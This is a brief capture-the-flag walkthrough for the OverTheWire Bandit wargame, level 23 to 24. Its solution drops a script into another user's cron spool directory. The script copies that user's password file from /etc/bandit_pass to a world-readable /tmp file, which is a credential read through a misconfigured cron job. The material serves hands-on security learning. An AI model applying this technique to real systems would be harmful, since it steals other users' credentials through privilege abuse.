# Bandit Level 23 → 24

## Goal
Place a script in the bandit24 cron directory that copies the bandit24 password to a readable temporary file.

## Solution path

```bash
cat > /var/spool/bandit24/foo/getpass.sh <<'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass
chmod 644 /tmp/bandit24_pass
EOF
chmod +x /var/spool/bandit24/foo/getpass.sh
cat /tmp/bandit24_pass
```

## What I learned
A controlled cron-job exercise: understand execution context, file permissions, and cleanup.

## Note
This file intentionally does not contain passwords. Use the live OverTheWire challenge to obtain them.
